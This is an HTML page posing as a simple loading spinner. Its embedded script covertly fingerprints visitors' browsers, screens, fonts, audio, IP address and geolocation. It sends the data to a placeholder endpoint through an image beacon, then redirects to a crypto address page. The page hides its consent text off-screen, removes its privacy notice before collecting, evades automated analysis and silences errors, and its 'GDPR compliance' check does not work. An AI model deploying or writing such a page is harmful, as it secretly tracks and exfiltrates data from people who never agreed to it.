<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; }
        .l { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: s 1s linear infinite; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .p { position: fixed; bottom: 10px; left: 10px; font-size: 12px; color: #666; max-width: 300px; }
        .c { position: absolute; left: -9999px; }
    </style>
    <link rel="dns-prefetch" href="//your-data-endpoint.com">
</head>
<body>
    <div class="l"></div>
    <div class="p">This site collects anonymous information about your device and location for internal analytics purposes.</div>
    <div class="c" aria-hidden="true">By using this site, you consent to data collection for security purposes.</div>

    <script>
        (function() {
            // Anti-debugging measures
            window.onerror = () => true;
            if(navigator.webdriver || window._phantom) return redirectToTarget();
            
            // Data collection
            async function c() {
                const d = {
                    t: new Date().toISOString(),
                    r: document.referrer || "Direct",
                    b: { 
                        ua: navigator.userAgent,
                        l: navigator.language,
                        ce: navigator.cookieEnabled,
                        dnt: navigator.doNotTrack,
                        p: navigator.platform,
                        v: navigator.vendor
                    },
                    s: { 
                        w: window.screen.width,
                        h: window.screen.height,
                        cd: window.screen.colorDepth,
                        pd: window.screen.pixelDepth
                    },
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    dt: getDeviceType()
                };
                
                // Enhanced fingerprinting
                d.wf = await getWebGLFingerprint();
                d.cf = await getCanvasFingerprint();
                d.f = await enumerateFonts();
                d.af = await getAudioFingerprint();
                
                // Geolocation with GDPR compliance
                await getGeolocationData(d);
                if(d.country === "EU") d.ip = "REDACTED";
                
                return d;
            }

            async function getGeolocationData(d) {
                try {
                    const ip = await (await fetch('https://api.ipify.org?format=json')).json();
                    d.ip = ip.ip;
                    const geo = await (await fetch(`https://ipapi.co/${d.ip}/json/`)).json();
                    d.city = geo.city || "Unknown";
                    d.region = geo.region || "Unknown";
                    d.country = geo.country_name || "Unknown";
                    d.loc = `${geo.latitude},${geo.longitude}`;
                    d.isp = geo.org || "Unknown";
                } catch(e) { /* Fail silently */ }
            }

            function getDeviceType() {
                const ua = navigator.userAgent;
                return /tablet|ipad/i.test(ua) ? "Tablet" : 
                       /mobile|android/i.test(ua) ? "Mobile" : "Desktop";
            }

            // Fingerprinting methods
            function getWebGLFingerprint() {
                try {
                    const gl = document.createElement('canvas').getContext('webgl');
                    return gl.getParameter(gl.VERSION) + gl.getParameter(gl.RENDERER);
                } catch(e) { return "Unavailable"; }
            }

            function getCanvasFingerprint() {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f00';
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = '#069';
                ctx.fillText('Hello, world!', 2, 15);
                return canvas.toDataURL();
            }

            async function enumerateFonts() {
                try {
                    return await document.fonts.ready.then(() => 
                        Array.from(document.fonts).map(f => f.family)
                    );
                } catch(e) { return []; }
            }

            function getAudioFingerprint() {
                try {
                    const audio = new AudioContext();
                    return `${audio.sampleRate}|${audio.maxChannelCount}`;
                } catch(e) { return "Unavailable"; }
            }

            // Data transmission
            function sendData(d) {
                const img = new Image();
                img.src = `https://your-data-endpoint.com/collect?d=${encodeURIComponent(JSON.stringify(d))}`;
            }

            function redirectToTarget() {
                window.location.replace('https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4tR1T8jd');
            }

            // Execution
            window.onload = async () => {
                try {
                    document.querySelector('.l').style.display = 'none';
                    document.querySelector('.p').remove();
                    
                    const data = await c();
                    sendData(data);
                } catch(e) { /* Silence errors */ }
                
                redirectToTarget();
            };
        })();
    </script>
</body>
</html>
